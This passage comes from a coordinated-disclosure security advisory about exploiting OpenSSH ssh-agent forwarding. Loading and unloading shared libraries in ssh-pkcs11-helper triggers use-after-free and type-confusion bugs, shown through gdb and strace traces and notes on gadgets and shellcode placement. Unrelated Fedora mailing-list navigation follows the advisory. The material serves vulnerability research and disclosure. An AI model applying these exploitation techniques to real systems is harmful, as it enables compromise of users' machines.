0x7fff7aae7fc0: nop
0x7fff7aae7fc1: nop
0x7fff7aae7fc2: nop
0x7fff7aae7fc3: nop
0x7fff7aae7fc4: nop
0x7fff7aae7fc5: nop
0x7fff7aae7fc6: nop
0x7fff7aae7fc7: nop
(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0 [stack]
========================================================================
Callback function use-after-free
========================================================================
While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:
- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
but not unloaded (munmap()ed) by dlclose(), because it is marked as
"nodelete" by the loader;
- a shared library (for example, libgnunetutil.so or gammaray\_probe.so)
is loaded and registers a userland callback function with the core
library (via gcry\_set\_allocation\_handler() or qtHookData[], for
example), but it does not deregister this callback function when
dlclose()d (i.e., when its code is munmap()ed);
- another shared library is loaded (mmap()ed) and replaces the unmapped
callback function's code with another piece of code (a useful gadget);
- yet another shared library is loaded and calls one of the core
library's functions, which in turn calls the unmapped callback
function and therefore executes the replacement code (the useful
gadget) instead, thus jumping to the stack.
------------------------------------------------------------------------
In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()
(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0 [stack]
(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254 0x00007f9ae7d82df4: call 0x7f9ae7d70180
66255 0x00007f9ae7d70180 : endbr64
66256 0x00007f9ae7d70184 : bnd jmp \*0x7aa9d(%rip) # 0x7f9ae7deac28
66257 0x00007f9af801bbe0 : endbr64
66258 0x00007f9af801bbe4 : push %r12
66259 0x00007f9af801bbe6 : push %rbx
66260 0x00007f9af801bbe7 : lea 0x3f(%rdi),%ebx
66261 0x00007f9af801bbea : mov $0x18,%edi
66262 0x00007f9af801bbef : shr $0x6,%ebx
66263 0x00007f9af801bbf2 : sub $0x8,%rsp
66264 0x00007f9af801bbf6 : call 0x7f9af801bb40
66265 0x00007f9af801bb40: endbr64
...
66285 0x00007f9af809cc60: mov 0xa8311(%rip),%rax # 0x7f9af8144f78
66286 0x00007f9af809cc67: test %rax,%rax
66287 0x00007f9af809cc6a: jne 0x7f9af809cc44
66288 0x00007f9af809cc44: call \*%rax
66289 0x00007f9afc27edc0: cmp %eax,%ebx
66290 0x00007f9afc27edc2: jne 0x7f9afc27f150
66291 0x00007f9afc27f150: mov %r14,%rsi
66292 0x00007f9afc27f153: mov %r13,%rdi
66293 0x00007f9afc27f156: call \*%rbx
------------------------------------------------------------------------
In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()
(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0 [stack]
(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347 0x00007f35f8972d26 <\_ZN7QObjectC2ER14QObjectPrivatePS\_+182>: lea 0x26acd3(%rip),%rax # 0x7f35f8bdda00
87348 0x00007f35f8972d2d <\_ZN7QObjectC2ER14QObjectPrivatePS\_+189>: mov 0x18(%rax),%rax
87349 0x00007f35f8972d31 <\_ZN7QObjectC2ER14QObjectPrivatePS\_+193>: test %rax,%rax
87350 0x00007f35f8972d34 <\_ZN7QObjectC2ER14QObjectPrivatePS\_+196>: jne 0x7f35f8972d88 <\_ZN7QObjectC2ER14QObjectPrivatePS\_+280>
87351 0x00007f35f8972d88 <\_ZN7QObjectC2ER14QObjectPrivatePS\_+280>: mov %rbx,%rdi
87352 0x00007f35f8972d8b <\_ZN7QObjectC2ER14QObjectPrivatePS\_+283>: call \*%rax
87353 0x00007f35fa445130 <\_ZN5KAuth15ObjectDecorator13setAuthActionERKNS\_6ActionE+80>: pop %rbp
87354 0x00007f35fa445131 <\_ZN5KAuth15ObjectDecorator13setAuthActionERKNS\_6ActionE+81>: ret
------------------------------------------------------------------------
Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-\*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.
In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.
Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()
(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0 [stack]
(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114 0x00007f8328147e3a: call 0x7f8328135500
79115 0x00007f8328135500 : endbr64
79116 0x00007f8328135504 : bnd jmp \*0x7a8dd(%rip) # 0x7f83281afde8
79117 0x00007f832e2b1220 : endbr64
79118 0x00007f832e2b1224 : sub $0x8,%rsp
79119 0x00007f832e2b1228 : call 0x7f832e32fbb0
79120 0x00007f832e32fbb0: endbr64
...
79140 0x00007f832e2b436e: mov 0x129dc3(%rip),%rax # 0x7f832e3de138
79141 0x00007f832e2b4375: test %rax,%rax
79142 0x00007f832e2b4378: je 0x7f832e2b43b0
79143 0x00007f832e2b437a: jmp \*%rax
79144 0x00007f832ed274f0: and $0x20,%al
79145 0x00007f832ed274f2: mov %rax,0x50(%rsp)
79146 0x00007f832ed274f7: mov 0x30(%rsp),%r13d
79147 0x00007f832ed274fc: mov 0x58(%rsp),%r15
79148 0x00007f832ed27501: mov %ebx,%ebp
79149 0x00007f832ed27503: mov %r8d,%edx
79150 0x00007f832ed27506: mov 0x50(%rsp),%rsi
79151 0x00007f832ed2750b: mov 0x28(%rsp),%r14
79152 0x00007f832ed27510: movslq 0x38(%r12),%rax
79153 0x00007f832ed27515: sub $0x8000,%ebp
79154 0x00007f832ed2751b: mov 0x54(%r12),%ecx
79155 0x00007f832ed27520: add %rax,%r14
79156 0x00007f832ed27523: mov %r14,%rdi
79157 0x00007f832ed27526: call \*%r15
========================================================================
Return from syscall use-after-free
========================================================================
While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib\*, we spotted an unusual SIGSEGV:
- a shared library is loaded, and its constructor function starts a
thread that sleeps for 10 seconds in kernel-land:
------------------------------------------------------------------------
3631347 openat(AT\_FDCWD, "/usr/lib/x86\_64-linux-gnu/cmpi/libcmpiOSBase\_ProcessorProvider.so", O\_RDONLY|O\_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT\_READ, MAP\_PRIVATE|MAP\_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT\_READ|PROT\_EXEC, MAP\_PRIVATE|MAP\_FIXED|MAP\_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT\_READ, MAP\_PRIVATE|MAP\_FIXED|MAP\_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT\_READ|PROT\_WRITE, MAP\_PRIVATE|MAP\_FIXED|MAP\_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3) = 0
...
3631347 clone3({flags=CLONE\_VM|CLONE\_FS|CLONE\_FILES|CLONE\_SIGHAND|CLONE\_THREAD|CLONE\_SYSVSEM|CLONE\_SETTLS|CLONE\_PARENT\_SETTID|CLONE\_CHILD\_CLEARTID, child\_tid=0x7f5f3bd70910, parent\_tid=0x7f5f3bd70910, exit\_signal=0, stack=0x7f5f3b570000, stack\_size=0x7fff00, tls=0x7f5f3bd70640} => {parent\_tid=[3631372]}, 88) = 3631372
...
3631372 clock\_nanosleep(CLOCK\_REALTIME, 0, {tv\_sec=10, tv\_nsec=0},
------------------------------------------------------------------------
- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
library (because it is not an actual PKCS#11 provider) and therefore
munmap()s the code where the sleeping thread should return to after
its sleep in kernel-land:
------------------------------------------------------------------------
3631347 socket(AF\_UNIX, SOCK\_DGRAM|SOCK\_CLOEXEC, 0) = 3
3631347 connect(3, {sa\_family=AF\_UNIX, sun\_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C\_GetFunctionList) failed: /usr/lib/x86\_64-linux-gnu/cmpi/libcmpiOSBase\_ProcessorProvider.so: undefined symbol: C\_GetFunctionList", 190, MSG\_NOSIGNAL, NULL, 0) = 190
3631347 close(3) = 0
3631347 munmap(0x7f5f3c3fb000, 33296) = 0
------------------------------------------------------------------------
- the sleeping thread returns from kernel-land and crashes with a
SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:
------------------------------------------------------------------------
3631372 <... clock\_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si\_signo=SIGSEGV, si\_code=SEGV\_MAPERR, si\_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------
Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()
(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0 [stack]
(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214 0x00007f4604b71866 <\_\_GI\_\_\_clock\_nanosleep+198>: syscall
...
240 0x00007f4604b71831 <\_\_GI\_\_\_clock\_nanosleep+145>: ret
...
244 0x00007f4604b766ef <\_\_GI\_\_\_nanosleep+31>: ret
...
255 0x00007f4604b7663d <\_\_sleep+93>: ret
256 0x00007f46050fecff: jmp 0x7f4604662e54 <\_\_ieee754\_j1f128+2276>
257 0x00007f4604662e54 <\_\_ieee754\_j1f128+2276>: movq 0x60(%rsp),%mm3
...
1304 0x00007f460466285b <\_\_ieee754\_j1f128+747>: add $0xc8,%rsp
1305 0x00007f4604662862 <\_\_ieee754\_j1f128+754>: ret
========================================================================
Sigaltstack use-after-free
========================================================================
From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:
------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------
On investigation, we discovered that at least one shared library
(libgnatcoll\_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA\_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS\_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:
- we randomly load zero or more shared libraries that permanently alter
the mmap layout;
- we load libgnatcoll\_postgres.so, which registers an alternate signal
stack and then munmap()s it without deregistering it;
- we randomly load zero or more shared libraries that alter the mmap
layout (again), and hopefully replace the unmapped signal stack with
another writable memory mapping (for example, a thread stack, or a
.data or .bss segment);
- we randomly load one shared library that registers an SA\_ONSTACK
signal handler but does not munmap() its code when dlclose()d (unlike
our original "Signal handler use-after-free" attack);
- we randomly load one shared library that raises this signal and
therefore calls the SA\_ONSTACK signal handler, thus overwriting the
replacement memory mapping with stack frames from the signal handler;
- we randomly load one or more shared libraries that hopefully use the
overwritten contents of the replacement memory mapping.
Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.
========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================
Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.
Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:
- a shared library raises a signal (a SIGSEGV in the example below, at
line 134110) and, in consequence of a "Signal handler use-after-free",
a replacement gadget of the form "ret N" is executed instead of the
signal handler (at line 134111);
- exactly as the real signal handler would, the replacement gadget
returns to the glibc's restore\_rt() function (at line 134112), which
in turn calls the kernel's rt\_sigreturn() function (at line 134113);
- however, before the kernel's rt\_sigreturn() function is called, the
replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
and as a result, the kernel's rt\_sigreturn() function restores all
userland registers (including RIP and RSP) from there;
------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables\_register\_target () from /lib/x86\_64-linux-gnu/libxtables.so.12
(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 : movzbl 0x18(%rax),%eax
(gdb) info registers
rax 0x0 0
...
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()
(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106 0x00007fcd4686719e : mov 0x6e1b(%rip),%rax # 0x7fcd4686dfc0
134107 0x00007fcd468671a5 : movzwl 0x22(%rbx),%edx
134108 0x00007fcd468671a9 : mov (%rax),%rax
134109 0x00007fcd468671ac : mov %dx,0x6(%rsp)
134110 [disabled]
134111 0x00007fcd48e434a0: ret $0x1f0f
134112 0x00007fcd49655520 <\_\_restore\_rt+0>: mov $0xf,%rax
134113 0x00007fcd49655527 <\_\_restore\_rt+7>: syscall
(gdb) info registers
rax 0x0 0
rbx 0xcccccccccccccccc -3689348814741910324
rcx 0xcccccccccccccccc -3689348814741910324
rdx 0xcccccccccccccccc -3689348814741910324
rsi 0xcccccccccccccccc -3689348814741910324
rdi 0xcccccccccccccccc -3689348814741910324
rbp 0xcccccccccccccccc 0xcccccccccccccccc
rsp 0xcccccccccccccccc 0xcccccccccccccccc
r8 0xcccccccccccccccc -3689348814741910324
r9 0xcccccccccccccccc -3689348814741910324
r10 0xcccccccccccccccc -3689348814741910324
r11 0xcccccccccccccccc -3689348814741910324
r12 0xcccccccccccccccc -3689348814741910324
r13 0xcccccccccccccccc -3689348814741910324
r14 0xcccccccccccccccc -3689348814741910324
r15 0xcccccccccccccccc -3689348814741910324
rip 0xcccccccccccccccc 0xcccccccccccccccc
------------------------------------------------------------------------
Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).
Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt\_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.
========================================================================
\_Unwind\_Context type-confusion
========================================================================
This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:
- some shared libraries load LLVM's libunwind.so as a "nodelete" library
(i.e., it is never unloaded, even after dlclose());
- some shared libraries throw a C++ exception, which loads GCC's
libgcc\_s.so and calls the \_Unwind\_GetCFA() function (at line 57295 in
the example below);
- however, GCC's libgcc\_s.so mistakenly calls LLVM's \_Unwind\_GetCFA()
(at line 57298) instead of GCC's \_Unwind\_GetCFA() (because LLVM's
libunwind.so was loaded first), and passes a pointer to GCC's struct
\_Unwind\_Context to this function (instead of a pointer to LLVM's
struct \_Unwind\_Context, which is a different type of structure);
- LLVM's \_Unwind\_GetCFA() then calls its unw\_get\_reg() function (at line
57303), which in turn calls a function pointer (at line 57311) that is
a member of LLVM's struct \_Unwind\_Context, but that happens to be a
stack pointer in GCC's struct \_Unwind\_Context;
------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()
(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0 [stack]
(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295 0x00007f7c8eaaccf1: call 0x7f7c8ea99470 <\_Unwind\_GetCFA@plt>
57296 0x00007f7c8ea99470 <\_Unwind\_GetCFA@plt+0>: endbr64
57297 0x00007f7c8ea99474 <\_Unwind\_GetCFA@plt+4>: bnd jmp \*0x1bc2d(%rip) # 0x7f7c8eab50a8 <\_Unwind\_GetCFA@got.plt>
57298 0x00007f7c8edce920 <\_Unwind\_GetCFA+0>: sub $0x18,%rsp
57299 0x00007f7c8edce924 <\_Unwind\_GetCFA+4>: mov %fs:0x28,%rax
57300 0x00007f7c8edce92d <\_Unwind\_GetCFA+13>: mov %rax,0x10(%rsp)
57301 0x00007f7c8edce932 <\_Unwind\_GetCFA+18>: lea 0x8(%rsp),%rdx
57302 0x00007f7c8edce937 <\_Unwind\_GetCFA+23>: mov $0xfffffffe,%esi
57303 0x00007f7c8edce93c <\_Unwind\_GetCFA+28>: call 0x7f7c8edca6b0
57304 0x00007f7c8edca6b0 : push %rbp
57305 0x00007f7c8edca6b1 : push %r14
57306 0x00007f7c8edca6b3 : push %rbx
57307 0x00007f7c8edca6b4 : mov %rdx,%r14
57308 0x00007f7c8edca6b7 : mov %esi,%ebp
57309 0x00007f7c8edca6b9 : mov %rdi,%rbx
57310 0x00007f7c8edca6bc : mov (%rdi),%rax
57311 0x00007f7c8edca6bf : call \*0x10(%rax)
(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336 /usr/lib/x86\_64-linux-gnu/libgcc\_s.so.1
(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811 /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------
========================================================================
RCE in library constructor
========================================================================
As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.
The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:
https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt
This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.
========================================================================
Discussion
========================================================================
We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:
- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
versions, distributions, or operating systems might be hiding further
surprises;
- our rudimentary fuzzer can certainly be greatly improved, and has
definitely not tried all the combinations of shared libraries and side
effects;
- we have identified seven attack vectors against ssh-agent (described
in the "Results" section), but we have not analyzed in detail all the
results of our fuzzer;
- we have not fully explored various aspects of these attack vectors:
- it might be possible to reliably exploit the "Sigaltstack
use-after-free" (by carefully overwriting the .data or .bss segment
of a shared library) or the "Sigreturn to arbitrary instruction
pointer" (by partially overwriting a leftover pointer in
ssh-pkcs11-helper's stack);
- we currently store our shellcode in ssh-pkcs11-helper's main() stack
buffer only, but it might be possible to store shellcode in other
stack buffers as well, or somehow spray the stack with shellcode,
which would dramatically increase our chances of jumping into our
shellcode;
for example, we tried to spray the stack with shellcode by
interrupting a memcpy() of controlled data with a signal handler,
thereby spilling controlled YMM registers to the stack (inspired by
https://bugs.chromium.org/p/project-zero/issues/detail?id=2266), but
we failed because we can memcpy() only ~10KB of data, and because we
cannot remotely use tricks such as inotify or sched\*() to precisely
time this race;
- it might be possible to control the mmap layout of ssh-pkcs11-helper
with page precision (which would allow us to precisely control the
gadget that replaces the unmapped signal handler, callback function,
or return from syscall), but we failed to find large malloc()ations
(which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
influence the mmap layout is to load and unload shared libraries, as
mentioned in Step 4a/ of the "Experiments" section);
- instead of replacing the unmapped signal handler or callback
function (or return from syscall) with a gadget from another shared
library, it is perfectly possible to replace it with an executable
thread stack (made executable by loading an "execstack" library),
but we have failed so far to control the contents of such a thread
stack.
========================================================================
Acknowledgments
========================================================================
We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.
========================================================================
Timeline
========================================================================
2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.
2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.
2023-07-09: We sent feedback about these patches to the OpenSSH
developers.
2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.
2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."
2023-07-19: Coordinated release.


=== Content from lists.fedoraproject.org_2d669a0a_20250110_133627.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
